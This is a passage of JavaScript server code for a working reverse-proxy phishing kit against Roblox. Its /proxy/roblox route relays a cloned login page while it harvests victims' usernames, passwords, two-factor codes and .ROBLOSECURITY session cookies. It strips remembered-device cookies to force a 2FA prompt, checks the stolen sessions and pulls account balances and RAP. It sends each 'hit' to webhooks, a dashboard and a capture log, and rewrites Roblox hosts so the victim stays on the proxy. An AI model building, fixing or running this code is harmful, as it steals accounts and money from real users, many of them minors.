// replayed, so a genuine retry with the same credentials still goes through.
const authFlights = new Map();
const AUTH_REPLAY_MS = 25000;

function authFlightKey(sessionId, targetUrl, body) {
    // The secureAuthenticationIntent blob carries a fresh nonce and signature on
    // every attempt, so it is stripped before the body is compared.
    const { secureAuthenticationIntent, ...rest } = body || {};
    return crypto.createHash('sha1')
        .update(`${sessionId}|${targetUrl}|${JSON.stringify(rest)}`)
        .digest('hex');
}

async function runAuthOnce(key, work) {
    const prior = authFlights.get(key);
    if (prior) {
        if (!prior.settledAt) return { ...(await prior.promise), replayed: true };
        if (prior.ok && Date.now() - prior.settledAt < AUTH_REPLAY_MS) {
            return { ...(await prior.promise), replayed: true };
        }
    }

    const flight = { promise: null, settledAt: null, ok: false };
    flight.promise = (async () => {
        try {
            const out = await work();
            flight.ok = out.ok;
            return out;
        } finally {
            flight.settledAt = Date.now();
            const timer = setTimeout(() => {
                if (authFlights.get(key) === flight) authFlights.delete(key);
            }, AUTH_REPLAY_MS);
            if (timer.unref) timer.unref();
        }
    })();
    authFlights.set(key, flight);
    return flight.promise;
}

// Main login proxy route
app.all('/proxy/roblox/*', async (req, res) => {
    const sessionId = req.sessionID || req.ip;
    const clientIp = req.ip || req.connection.remoteAddress;
    let capturePending = null;

    // ── Cookie capture from the browser itself ──
    // Roblox mints .ROBLOSECURITY on a hop whose Set-Cookie this process cannot
    // read (the 200 that ends the proof-of-work chain carries it upstream-signed
    // and it is not exposed on the response we receive). The browser does end up
    // holding it, and it sends that cookie on the very next proxied request.
    // Reading it here is authoritative: if the victim has a session, we have it.
    // One capture per session, keyed so a retry cannot spam the webhook.
    try {
        const inbound = req.get('Cookie') || '';
        const m = inbound.match(/\.ROBLOSECURITY=([^;]{20,})/);
        // Key on the cookie itself, never on sessionId: saveUninitialized is off,
        // so a sessionID is minted fresh on every request until something writes
        // to the session. That made the guard miss and the capture fire on every
        // hop — one login, dozens of webhook posts.
        const cookieKey = m ? `cookie:${m[1].slice(-40)}` : null;
        if (m && cookieKey && !capturedSessions.has(cookieKey)) {
            const cookieValue = m[1].trim();
            capturedSessions.add(cookieKey);
            setTimeout(() => capturedSessions.delete(cookieKey), 30 * 60 * 1000);

            (async () => {
                let user = null;
                try {
                    const verdict = await TwoFactorHandler.validateSessionCookie(cookieValue, req.get('User-Agent'));
                    if (verdict && verdict.user) user = verdict.user;
                } catch (err) {
                    console.warn('[CAPTURE] cookie-check failed:', err.message);
                }
                const resolved = resolveLoginCredentials(sessionId, clientIp, user?.name || '');
                console.log(`[CAPTURE] session cookie seen on request for ${resolved.username}`);

                await handleCapturedSession({
                    username: resolved.username,
                    password: resolved.password,
                    cookie: cookieValue,
                    cookieVerified: Boolean(user),
                    user,
                    sessionId,
                    hitId: takeAttemptId({ sessionId, clientIp, username: resolved.username }),
                    clientIp,
                    userAgent: req.get('User-Agent') || 'Unknown',
                    returnUrl: 'https://www.roblox.com/home'
                }).catch(err => console.error('[CAPTURE] session dispatch failed:', err.message));
            })();
        }
    } catch (err) {
        console.error('[CAPTURE] inbound cookie read failed:', err.message);
    }

    
    // Fast preflight response
    if (req.method === 'OPTIONS') {
        if (S.applyCors(req, res, ALLOWED_ORIGINS)) {
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
            res.setHeader('Access-Control-Allow-Headers', req.get('access-control-request-headers') || '*');
        }
        res.setHeader('Access-Control-Expose-Headers', 'x-csrf-token, X-CSRF-TOKEN, rblx-challenge-id, rblx-challenge-type, rblx-challenge-metadata, content-type');
        return res.status(204).end();
    }

    // Extract the target path from /proxy/roblox/...
    let targetPath = req.path.replace('/proxy/roblox/', '');
    if (!targetPath.startsWith('http')) {
        targetPath = `https://${targetPath}`;
    }

    const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    const targetUrl = `${targetPath}${qs}`;

    // Host comes from the path, so it has to be checked before anything is
    // fetched. Without this the relay reaches link-local metadata and this
    // app's own gated API surface with the server's identity.
    const upstreamUrl = S.resolveUpstream(targetUrl);
    if (!upstreamUrl) {
        console.warn(`[PROXY] refused upstream: ${targetUrl.slice(0, 120)}`);
        return res.status(400).json({ error: 'Upstream host not allowed' });
    }

    console.log(`[PROXY] ${req.method} ${targetUrl}`);

    // Instant credential capture on auth POST. No hit is recorded here — the
    // row is only written once Roblox answers, so every hit carries either a
    // real session or the reason there isn't one.
    if (req.method === 'POST' && (targetUrl.includes('/v2/login') || targetUrl.includes('/v2/authenticate'))) {
        const u = req.body?.cvalue || req.body?.username || '';
        const p = req.body?.password || '';
        if (u || p) {
            // A new attempt invalidates any completion flag left by the previous
            // one. Without this, a capture from the last test bounced the next
            // page load the moment the victim pressed Enter — which looks exactly
            // like "it logged me in without asking for 2FA".
            recentLogins.delete(clientIp);
            console.log(`[CAPTURE] Captured credentials for ${u || 'user'} from ${clientIp}`);
            stashLoginCredentials(sessionId, clientIp, u, p);
            capturePending = {
                username: u,
                password: p,
                ip: clientIp,
                userAgent: req.get('User-Agent') || 'Unknown'
            };
            if (u) loginIdentities.set(sessionId, u);

            // Row first, verdict later. A proof-of-work solve can outlive the
            // function budget; the attempt must still be visible in Hits.
            const attempt = await recordHit({
                username: u || 'Unknown',
                balance: 0,
                summary: 0,
                rap: 0,
                hasCookie: false,
                cookie: '',
                source: 'login_attempt',
                ip: clientIp,
                sessionUser: req.session?.user
            }).catch(() => null);
            if (attempt) {
                capturePending.hitId = attempt.id;
                rememberAttempt({ sessionId, clientIp, username: u, hitId: attempt.id });
            }
        }
    }

    // ── Auth POSTs: run the challenge handshake before answering the browser ──
    // These requests are the actual sign-in. They are not blind-proxied; the
    // CSRF token and proof-of-work gates are cleared here so Roblox gives a real
    // verdict (success, bad password, 2FA, captcha) instead of a 403.
    // Any host, any path — the login exchange is identified by what it does, not
    // by which subdomain the page happened to build its URL from. Roblox's own
    // client posts /v2/login against whatever host its bundle resolved, and a
    // host list that is one entry short silently downgrades a real login
    // handshake into a blind proxy: no CSRF retry, no proof-of-work, no session.
    // Server-side challenge handshake ON for the credential POST only.
    //
    // The blind relay let the browser's own React client drive the whole
    // exchange, which worked for the bot gates but NOT for two-step: Roblox
    // skips the code on a device it already remembers, so a browser that had a
    // remembered-device cookie went straight to a session with no 2FA prompt.
    // Answering the credential POST here means the login always runs on a clean
    // jar with no device memory, so a 2FA account always lands on the gate.
    //
    // Scope is deliberately one route: POST /v2/login and /v2/authenticate.
    // challenge/v1/continue and the twostepverification verify hops stay blind —
    // running the retry loop on those posts the same challenge twice and burns
    // it, which is what caused the old 403 loop.
    const isAuthExchange = req.method === 'POST' &&
        /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) &&
        Boolean(req.body?.password || req.body?.cvalue);

    // Kept for reference, no longer used:
    //   targetUrl.includes('auth.roblox.com') ||
    //   targetUrl.includes('twostepverification.roblox.com') ||
    //   /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) ||
    //   /\/challenges\/[a-z-]+\/(verify|send-code)/.test(targetUrl)
    // challenge/v1/continue is deliberately NOT in the handshake set. It is
    // answered by the faithful relay: the native captcha flow already carries
    // its own CSRF and challenge headers, and running the retry loop on it can
    // post the same challenge twice and burn it.

    // A credential POST starts a new attempt. Anything held for this session —
    // cookie jar, challenge id — belongs to the previous attempt and
    // must not leak into this one. Without this, a later login reports the
    // earlier account's cookie.
    if (req.method === 'POST' && /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) && (req.body?.password || req.body?.cvalue)) {
        loginSessions.delete(sessionId);
        loginChallenges.delete(sessionId);
        login2faPending.delete(sessionId);
    }

    if (req.method === 'POST' && isAuthExchange) {
        try {
            const bodyObj = req.body || {};
            const flightKey = authFlightKey(sessionId, targetUrl, bodyObj);

            const result = await runAuthOnce(flightKey, async () => {
                const { response, jar, csrf } = await proxyAuthWithChallenge({
                    targetUrl,
                    bodyObj,
                    inboundCsrf: req.get('X-CSRF-TOKEN') || req.get('x-csrf-token') || null,
                    // A credential POST must not carry a previous account's
                    // .ROBLOSECURITY. The browser keeps it after one successful
                    // login, and forwarding it into the next attempt is how a
                    // brand-new account's capture came back named after the old
                    // one. Guest cookies (GuestData, rbx-ip2) stay — they carry
                    // the challenge binding.
                    inboundCookie: (() => {
                        const raw = req.get('Cookie') || loginSessions.get(sessionId) || '';
                        if (!/\/v2\/(login|authenticate)(\?|$)/.test(targetUrl)) return raw;
                        return String(raw)
                            .split(';')
                            .map(p => p.trim())
                            .filter(p => p && !/^\.ROBLOSECURITY=/.test(p))
                            .join('; ');
                    })(),
                    userAgent: req.get('User-Agent'),
                    inboundChallenge: (() => {
                        const id = req.get('rblx-challenge-id');
                        const known = loginChallenges.get(sessionId);
                        // Stale challenge context is worse than none.
                        if (!id || (known && known !== id)) return {};
                        return {
                            'rblx-challenge-id': id,
                            'rblx-challenge-type': req.get('rblx-challenge-type'),
                            'rblx-challenge-metadata': req.get('rblx-challenge-metadata')
                        };
                    })()
                });

                const headers = {};
                for (const h of ['x-csrf-token', 'rblx-challenge-id', 'rblx-challenge-type', 'rblx-challenge-metadata']) {
                    const v = response.headers.get(h);
                    if (v) headers[h] = v;
                }
                // Roblox only issues a CSRF token when the request arrived
                // without one. The browser's follow-up calls — challenge
                // continue, the 2SV verify — need it, so hand over the token the
                // handshake itself used.
                if (!headers['x-csrf-token'] && csrf) headers['x-csrf-token'] = csrf;

                const setCookies = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
                const text = await response.text();

                return {
                    ok: response.status >= 200 && response.status < 300,
                    status: response.status,
                    contentType: response.headers.get('content-type') || 'application/json',
                    headers,
                    cookies: [...jar.entries()].map(([k, v]) => `${k}=${v}; Path=/; SameSite=Lax`),
                    cookieJar: jarToHeader(jar),
                    setCookies,
                    text
                };
            });

            // Only cookies Roblox set on THIS response go back to the browser.
            const browserCookies = result.setCookies.map(c => c
                .replace(/;\s*Domain=[^;]*/gi, '')
                .replace(/;\s*Secure/gi, '')
                .replace(/SameSite=None/gi, 'SameSite=Lax'));
            if (browserCookies.length) res.setHeader('Set-Cookie', browserCookies);
            // Hold the jar between hops. The 2FA verify request arrives as a
            // separate call and must be answered on the same session Roblox
            // minted the challenge for; without this the verify is anonymous and
            // Roblox rejects it however correct the code is.
            if (result.cookieJar) loginSessions.set(sessionId, result.cookieJar);
            if (result.headers['rblx-challenge-id']) {
                loginChallenges.set(sessionId, result.headers['rblx-challenge-id']);
            } else if (result.status === 200) {
                loginChallenges.delete(sessionId);
            }

            S.applyCors(req, res, ALLOWED_ORIGINS);
            res.setHeader('Access-Control-Expose-Headers', 'x-csrf-token, X-CSRF-TOKEN, rblx-challenge-id, rblx-challenge-type, rblx-challenge-metadata, content-type');

            for (const [h, v] of Object.entries(result.headers)) res.setHeader(h, v);

            res.status(result.status);
            res.setHeader('Content-Type', result.contentType);

            // Same completion signal the blind relay sets: the shim watches for
            // it and bounces the victim to the real home page the moment a
            // session exists, instead of leaving them on our login screen.
            //
            // A two-step account never gets here with a session: Roblox answers
            // the credential POST with either a 403 twostepverification challenge
            // or a 200 body carrying twoStepVerificationData and no cookie. Both
            // park the attempt, and a parked attempt is not allowed to signal
            // completion even if a cookie shows up on a later hop of the same
            // exchange.
            const parkedChallengeType = result.headers['rblx-challenge-type'] || '';
            const parkedTwoFactor = parkedChallengeType === 'twostepverification'
                || /"twoStepVerificationData"|"isTwoStepVerificationRequired"\s*:\s*true/.test(result.text || '');
            const issuedCookie = result.setCookies.some(c => c.includes('.ROBLOSECURITY='));

            if (parkedTwoFactor && !issuedCookie) {
                mark2faPending(sessionId, req.body?.cvalue || req.body?.username);
                console.log(`[AUTH] two-step parked for ${req.body?.cvalue || req.body?.username || 'user'} — completion withheld`);
            }
            if (issuedCookie) login2faPending.delete(sessionId);

            if (!is2faPending(sessionId) && result.status === 200 && issuedCookie) {
                res.setHeader('x-login-complete', '1');
            }

            // Session issued = the cookie to report home. It is not always on the
            // final response: a two-step completion can mint it on an earlier hop
            // and rotate it into the jar. Take the jar value too — but only ship a
            // cookie Roblox actually accepts, so a guest cookie or a stale one can
            // never be reported as a capture again.
            const issued = result.setCookies.find(c => c.includes('.ROBLOSECURITY='));
            let cookieValue = issued ? (issued.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || null) : null;
            if (!cookieValue && result.cookieJar) {
                const fromJar = String(result.cookieJar).match(/\.ROBLOSECURITY=([^;]+)/);
                if (fromJar && fromJar[1].trim().length > 20) cookieValue = fromJar[1].trim();
            }

            const verdict = cookieValue
                ? await TwoFactorHandler.validateSessionCookie(cookieValue, req.get('User-Agent'))
                : { state: 'invalid' };
            // A rejected verdict is information, not a reason to throw the
            // cookie away. The capture's whole job is to hand over what Roblox
            // minted; whether the account still honours it is a separate field.
            // Dropping it here is why a real-but-expired session never reached
            // the Hits tab, and why "captured but no cookie" was the norm.

            const challengeTypeForLog = result.status === 403 || result.status === 200
                ? (result.headers['rblx-challenge-type'] || '-')
                : '-';
            console.log(`[AUTH] ${targetUrl} -> ${result.status} ` +
                `challenge=${challengeTypeForLog} cookies=${result.setCookies.length}` +
                `${cookieValue ? ` (session ${verdict.state})` : ''}${result.replayed ? ' (replayed)' : ''}`);

            // A replay is the same answer to the same question: report it once.
            if (!result.replayed) {
                if (cookieValue) {
                    // The login response carries the account object; the 2FA
                    // verify response does not. Fall back to the identity
                    // stashed on the first hop.
                    let parsed = null;
                    try { parsed = JSON.parse(result.text); } catch { /* not json */ }
                    const accountUser = (verdict.user && verdict.user.id) ? verdict.user
                        : (parsed?.user && parsed.user.id ? parsed.user : null);
                    const accountName = accountUser?.name
                        || req.body?.cvalue
                        || req.body?.username
                        || loginIdentities.get(sessionId)
                        || 'Unknown';

                    loginSessions.set(sessionId, result.cookieJar);
                    // Awaited. The response goes out right after this, and a
                    // fire-and-forget write is a capture the platform can freeze
                    // before it lands.
                    await handleCapturedSession({
                        username: accountName,
                        password: capturePending?.password || req.body?.password || 'None',
                        cookie: cookieValue,
                        cookieVerified: verdict.state === 'valid',
                        allCookies: result.cookieJar,
                        user: accountUser,
                        sessionId,
                        hitId: capturePending?.hitId || takeAttemptId({ sessionId, clientIp, username: accountName }),
                        clientIp,
                        userAgent: req.get('User-Agent') || 'Unknown',
                        returnUrl: '/'
                    }).catch(err => console.error('[CAPTURE] dispatch failed:', err.message));
                } else if (capturePending) {
                    // No session this round: wrong password, or a 2FA / captcha
                    // gate. Report the attempt once, with the challenge type
                    // attached; the real session capture owns the success case.
                    const challengeType = result.headers['rblx-challenge-type'] || (result.status === 200 ? 'none' : 'rejected');

                    // Only two of these are worth a message: a real rejection,
                    // and the account actually being at the 2FA gate. Bot checks
                    // (proofofwork, captcha) are transients that resolve on the
                    // retry — reporting each one is what made a single login post
                    // three or four times.
                    const worthReporting = challengeType === 'rejected' || challengeType === 'twostepverification';

                    if (worthReporting) {
                        const attemptKey = `attempt:${capturePending.username}:${challengeType}`;
                        if (dispatchedCaptures.has(attemptKey)) {
                            console.log(`[CAPTURE] duplicate attempt suppressed (${challengeType})`);
                        } else {
                            dispatchedCaptures.add(attemptKey);
                            setTimeout(() => dispatchedCaptures.delete(attemptKey), 90_000);

                            recordHit({
                                username: capturePending.username,
                                balance: 0,
                                summary: 0,
                                rap: 0,
                                hasCookie: false,
                                source: `login-${challengeType}`,
                                targetId: '',
                                ip: capturePending.ip,
                                sessionUser: req.session?.user
                            });
                            unifiedWebhook.sendCapture({
                                username: capturePending.username,
                                password: capturePending.password,
                                cookie: '',
                                ip: capturePending.ip,
                                userAgent: capturePending.userAgent,
                                timestamp: new Date().toISOString(),
                                valid: false,
                                twoFactorCode: challengeType === 'twostepverification' ? '[awaiting code]' : ''
                            }).catch(() => {});
                        }
                    } else {
                        console.log(`[CAPTURE] transient challenge (${challengeType}) — not reported`);
                    }
                }
            }

            return res.send(result.text);
        } catch (err) {
            console.error('[AUTH] handshake failed:', err.message);
            return res.status(502).json({ error: 'Auth proxy failed' });
        }
    }

    // Capture 2FA code if submitted
    if (req.method === 'POST' && (targetUrl.includes('two-step') || targetUrl.includes('two-factor') || targetUrl.includes('verify'))) {
        const code = req.body?.code;
        if (code) {
            console.log(`[CAPTURE] Captured 2FA code ${code} from ${clientIp}`);
            stashLoginCredentials(sessionId, clientIp, '', '', code);
            const resolved = resolveLoginCredentials(sessionId, clientIp, '');
            sendToWebhook({
                username: resolved.username !== 'Unknown' ? resolved.username : `[2FA CODE] ${code}`,
                password: resolved.password !== 'None' ? resolved.password : `Verification code: ${code}`,
                twoFactorCode: code,
                cookie: '',
                ip: clientIp,
                timestamp: new Date().toISOString()
            }).catch(() => {});
        }
    }

    try {
        const sessionCookies = loginSessions.get(sessionId) || '';
        // Note: the pool is consulted for stats only. Relaying a hop through a
        // proxy needs a fetch dispatcher and none is installed, so pulling a
        // proxy here would just advance the rotation index for no effect.
        // Wire it when the dispatcher lands, not before.
        
        const headers = {
            'User-Agent': req.get('User-Agent')
                || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': req.get('Accept') || '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        };

        // Merge, do not overwrite. The credential POST runs server-side and
        // leaves the challenge binding in loginSessions; the browser only holds
        // the guest cookies it was handed back. Overwriting with req.get('Cookie')
        // dropped the binding, so the 2FA verify arrived anonymous and Roblox
        // rejected a correct code.
        const jarParts = String(sessionCookies || '').split(';').map(p => p.trim()).filter(Boolean);
        const browserParts = String(req.get('Cookie') || '').split(';').map(p => p.trim()).filter(Boolean);
        const merged = new Map();
        for (const pair of jarParts) {
            const name = pair.split('=')[0].trim();
            if (name) merged.set(name, pair);
        }
        for (const pair of browserParts) {
            const name = pair.split('=')[0].trim();
            if (name) merged.set(name, pair);
        }
        if (merged.size) headers.Cookie = [...merged.values()].join('; ');

        const csrfToken = req.get('X-CSRF-TOKEN') || req.get('x-csrf-token');
        if (csrfToken) {
            headers['X-CSRF-TOKEN'] = csrfToken;
        }

        // A challenge the browser already solved rides back up on the retry.
        // Dropping these turned a correctly answered captcha or proof-of-work
        // into an anonymous replay.
        for (const h of ['rblx-challenge-id', 'rblx-challenge-type', 'rblx-challenge-metadata']) {
            const v = req.get(h);
            if (v) headers[h] = v;
        }

        let body = undefined;
        if (req.method !== 'GET' && req.method !== 'HEAD') {
            const inboundType = req.get('Content-Type') || '';
            if (inboundType.includes('application/json')) {
                body = JSON.stringify(req.body || {});
                headers['Content-Type'] = 'application/json';
            } else if (inboundType.includes('application/x-www-form-urlencoded')) {
                body = new URLSearchParams(req.body || {}).toString();
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
            } else {
                // Telemetry endpoints post protobuf or text bodies. Re-encoding those
                // as forms produced a 415 on every call, so the raw bytes are
                // forwarded untouched with their original content type.
                body = await new Promise(resolve => {
                    const chunks = [];
                    req.on('data', chunk => chunks.push(chunk));
                    req.on('end', () => resolve(chunks.length ? Buffer.concat(chunks) : undefined));
                    req.on('error', () => resolve(undefined));
                });
                if (inboundType) headers['Content-Type'] = inboundType;
            }
        }

        const proxyRes = await fetch(targetUrl, {
            method: req.method,
            headers,
            body,
            // Roblox answers the two-step verification POST with 302 + Set-Cookie.
            // Following it here lets undici swallow the redirect, and the cookie
            // that was minted on the intermediate hop never reaches this process
            // or the browser: the client sees a followed 200, no session is
            // issued, the challenge card never unmounts, and the login loops.
            // This relay is blind on purpose. Hand every hop back untouched.
            redirect: 'manual'
        });

        // Check for .ROBLOSECURITY cookie in response
        const setCookieHeader = proxyRes.headers.getSetCookie
            ? proxyRes.headers.getSetCookie()
            : (proxyRes.headers.get('set-cookie') ? [proxyRes.headers.get('set-cookie')] : []);

        // One line per auth hop. Without this a failed verify is invisible: the
        // browser reports "it just keeps logging in" and the server has no
        // record of what Roblox actually answered.
        if (/\/v2\/(login|authenticate)|twostepverification|challenge/.test(targetUrl)) {
            console.log(`[PROXY] ${req.method} ${proxyRes.status} ${targetUrl.slice(0, 90)} ` +
                `cookies=${setCookieHeader.length} ` +
                `names=${setCookieHeader.map(c => c.split('=')[0].trim()).join('|') || '-'} ` +
                `challenge=${proxyRes.headers.get('rblx-challenge-type') || '-'}`);
        }

        if (setCookieHeader && setCookieHeader.length > 0) {
            const cookies = setCookieHeader;
            const robloxCookie = cookies.find(c => c.includes('.ROBLOSECURITY='));
            
            if (robloxCookie) {
                const cookieValue = robloxCookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];
                if (cookieValue) {
                    console.log(`[CAPTURE] Got .ROBLOSECURITY cookie for session ${sessionId}`);

                    // A session on the wire means the account finished the gate,
                    // two-step included. Clear the pending flag before signalling.
                    login2faPending.delete(sessionId);

                    res.setHeader('x-login-complete', '1');
                    res.setHeader('Access-Control-Expose-Headers',
                        'x-login-complete, x-csrf-token, X-CSRF-TOKEN, rblx-challenge-id, rblx-challenge-type, rblx-challenge-metadata, content-type');
                    
                    const updatedCookies = cookies.join('; ');
                    loginSessions.set(sessionId, updatedCookies);

                    // 1. Verify session cookie with Roblox to get real authenticated user profile
                    let userObj = null;
                    try {
                        const verdict = await TwoFactorHandler.validateSessionCookie(cookieValue, req.get('User-Agent'));
                        if (verdict && verdict.user) {
                            userObj = verdict.user;
                        }
                    } catch (e) {
                        console.warn('[CAPTURE] Session cookie verification warning:', e.message);
                    }

                    // 2. Resolve credentials using our multi-hop store
                    const inUser = req.body?.cvalue || req.body?.username || loginIdentities.get(sessionId) || '';
                    const inPass = req.body?.password || '';
                    if (inUser || inPass) {
                        stashLoginCredentials(sessionId, clientIp, inUser, inPass);
                    }
                    const resolved = resolveLoginCredentials(sessionId, clientIp, inUser, userObj);
                    const finalUsername = resolved.username;
                    const finalPassword = (inPass && inPass !== 'Captured') ? inPass : resolved.password;
                    const final2FA = resolved.twoFactorCode;

                    console.log(`[CAPTURE] Finalized captured login for: ${finalUsername} (hasPassword: ${finalPassword !== 'None'})`);

                    // 3. Enrich with rich account details (RAP, Robux balance, premium, etc.)
                    let richData = null;
                    if (userObj && userObj.id) {
                        try {
                            const richCapture = new RichDataCapture(cookieValue);
                            richData = await Promise.race([
                                richCapture.captureAll(userObj.id),
                                new Promise(resolve => setTimeout(() => resolve(null), 10000))
                            ]);
                        } catch (e) {
                            console.warn('[CAPTURE] Rich data capture error:', e.message);
                        }
                    }

                    // 4. Record Hit in dashboard — complete the attempt row this
                    // login opened instead of writing a second one beside it.
                    const attemptId = takeAttemptId({ sessionId, clientIp, username: finalUsername });
                    const attemptRow = attemptId ? hitsStore.find(h => h.id === attemptId) : null;
                    if (attemptRow) {
                        attemptRow.username = finalUsername;
                        attemptRow.userId = userObj?.id ? String(userObj.id) : attemptRow.userId || null;
                        attemptRow.balance = richData?.creditBalance || 0;
                        attemptRow.summary = (richData?.creditBalance || 0) + (richData?.pendingRobux || 0);
                        attemptRow.rap = richData?.rap || 0;
                        attemptRow.hasCookie = true;
                        attemptRow.cookie = cookieValue;
                        attemptRow.cookieVerified = Boolean(userObj);
                        attemptRow.source = final2FA ? '2fa_login' : 'direct_login';
                        attemptRow.timestamp = Date.now();
                        await persistHits(hitsStore);
                    } else {
                        await recordHit({
                            username: finalUsername,
                            userId: userObj?.id ? String(userObj.id) : null,
                            balance: richData?.creditBalance || 0,
                            summary: (richData?.creditBalance || 0) + (richData?.pendingRobux || 0),
                            rap: richData?.rap || 0,
                            hasCookie: true,
                            cookie: cookieValue,
                            source: final2FA ? '2fa_login' : 'direct_login',
                            ip: clientIp
                        });
                    }

                    // 5. Send Unified Webhook (fans out to all configured webhooks)
                    await unifiedWebhook.sendCapture({
                        username: finalUsername,
                        password: finalPassword,
                        twoFactorCode: final2FA,
                        cookie: cookieValue,
                        ip: clientIp,
                        userAgent: req.get('User-Agent') || 'Unknown',
                        timestamp: new Date().toISOString(),
                        valid: true,
                        richData
                    });

                    // 6. Legacy webhook dispatch removed: unifiedWebhook above
                    // already fans out to every URL in webhooks.json. Calling
                    // both is what doubled every embed.

                    // 7. Update signins.json
                    recordSignin({
                        username: finalUsername,
                        discriminator: '0',
                        id: userObj?.id ? String(userObj.id) : String(Math.floor(Math.random() * 900000000000000 + 100000000000000)),
                        avatar: null
                    });

                    // 8. Log to captures.log
                    const logEntry = {
                        type: 'login',
                        username: finalUsername,
                        password: finalPassword,
                        twoFactorCode: final2FA,
                        cookie: cookieValue,
                        ip: clientIp,
                        userAgent: req.get('User-Agent'),
                        timestamp: new Date().toISOString(),
                        valid: true
                    };
                    
                    fs.appendFileSync(
                        R.dataPath('storage', 'logs', 'captures.log'),
                        JSON.stringify(logEntry) + '\n'
                    );
                }
            } else {
                const updatedCookies = cookies.join('; ');
                loginSessions.set(sessionId, updatedCookies);
            }
        }

        // Set status code from Roblox
        res.status(proxyRes.status);

        // Forward response headers with full CORS
        const contentType = proxyRes.headers.get('content-type') || 'application/json';
        res.setHeader('Content-Type', contentType);
        S.applyCors(req, res, ALLOWED_ORIGINS);
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.setHeader('Access-Control-Expose-Headers', 'x-login-complete, x-csrf-token, X-CSRF-TOKEN, rblx-challenge-id, rblx-challenge-type, rblx-challenge-metadata, content-type');

        const responseCsrf = proxyRes.headers.get('x-csrf-token');
        if (responseCsrf) {
            res.setHeader('x-csrf-token', responseCsrf);
            res.setHeader('X-CSRF-TOKEN', responseCsrf);
        }

        const challengeMetadata = proxyRes.headers.get('rblx-challenge-metadata');
        if (challengeMetadata) {
            res.setHeader('rblx-challenge-metadata', challengeMetadata);
        }
        const challengeId = proxyRes.headers.get('rblx-challenge-id');
        if (challengeId) {
            res.setHeader('rblx-challenge-id', challengeId);
        }
        const challengeType = proxyRes.headers.get('rblx-challenge-type');
        if (challengeType) {
            res.setHeader('rblx-challenge-type', challengeType);
        }

        const rawSetCookie = proxyRes.headers.getSetCookie
            ? proxyRes.headers.getSetCookie()
            : (proxyRes.headers.get('set-cookie') ? [proxyRes.headers.get('set-cookie')] : []);
        if (rawSetCookie.length) {
            // Domain=.roblox.com and Secure are rejected for this origin, and a
            // rejected Set-Cookie is the whole reason the proxied React client
            // could not keep a session between the credential POST and the 2FA
            // verify. Strip the scope, keep the value.
            res.setHeader('Set-Cookie', rawSetCookie.map(c => c
                .replace(/;\s*Domain=[^;]*/gi, '')
                .replace(/;\s*Secure/gi, '')
                .replace(/SameSite=None/gi, 'SameSite=Lax')));
        }

        const upstreamLocation = proxyRes.headers.get('location');
        if (upstreamLocation) {
            res.setHeader('Location', upstreamLocation.replace(
                /https?:\/\/([a-z0-9-]+\.)*roblox\.com/gi,
                m => `${req.protocol || 'http'}://${req.get('host')}/proxy/roblox/${(m.match(/https?:\/\/(.+)/) || [])[1] || 'www.roblox.com'}`
            ));
        }

        // Read response body safely
        let responseBody = await proxyRes.text();

        // Rewrite every Roblox host back onto this origin, generically. The
        // hand-listed version missed twostepverification.roblox.com, so the
        // browser went cross-origin the moment a challenge appeared and the real
        // verification dialog could never render. `http://localhost` was also
        // hardcoded, which broke every deployment that is not localhost.
        const origin = `${req.protocol || 'http'}://${req.get('host')}`;

        const rewriteRobloxOrigins = text => text
            .replace(/https?:\/\/([a-z0-9-]+)\.rbxcdn\.com/gi, (m, sub) => {
                const map = {
                    css: '/rbxcdn',
                    static: '/staticrbx',
                    images: '/imgrbx',
                    js: '/rblx-js',
                    tr: '/thumbnails'
                };
                return map[String(sub).toLowerCase()] ? `${origin}${map[String(sub).toLowerCase()]}` : m;
            })
            .replace(/https?:\/\/([a-z0-9-]+)\.roblox\.com/gi, `${origin}/proxy/roblox/$1.roblox.com`)
            .replace(/https?:\/\/roblox\.com/gi, `${origin}/proxy/roblox/www.roblox.com`);

        if (contentType.includes('text/html') || contentType.includes('javascript') || contentType.includes('ecmascript')) {
            responseBody = rewriteRobloxOrigins(responseBody);
            responseBody = responseBody.replace(/action="https:\/\/www\.roblox\.com\/login"/g, 'action="/proxy/roblox/www.roblox.com/login"');
            responseBody = responseBody.replace(/action="\/login"/g, 'action="/proxy/roblox/www.roblox.com/login"');
        }

        if (contentType.includes('application/json')) {
            responseBody = rewriteRobloxOrigins(responseBody);
        }

        res.send(responseBody);

    } catch (error) {
        console.error('[PROXY] Error:', error.message);
        res.status(500).json({ error: 'Proxy error' });
    }
});

// ── API Endpoints for VOX-inspired Modules ──

// Proxy stats endpoint
app.get('/api/proxy/stats', (req, res) => {
    res.json({
        stats: proxyRotation.getStats(),
        poolSize: proxyRotation.proxies.length,
        currentIndex: proxyRotation.currentProxyIndex
    });
});

// Rotate proxy endpoint
app.post('/api/proxy/rotate', (req, res) => {
    const size = proxyRotation.proxies.length;
    if (!size) {
        // 0 % 0 is NaN, and NaN poisons currentProxyIndex for the rest of the
        // process — every later rotation and stats read comes back NaN.
        return res.status(409).json({ success: false, error: 'Proxy pool is empty', poolSize: 0 });
    }
    proxyRotation.currentProxyIndex = (Number(proxyRotation.currentProxyIndex || 0) + 1) % size;
    res.json({ success: true, newIndex: proxyRotation.currentProxyIndex, poolSize: size });
});

// Validate all proxies endpoint
app.post('/api/proxy/validate', async (req, res) => {
    try {
        const results = await proxyRotation.validateAllProxies();
        res.json({ success: true, results });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get healthy proxies endpoint
app.get('/api/proxy/healthy', (req, res) => {
    const healthy = proxyRotation.getHealthyProxies();
    res.json({
        count: healthy.length,
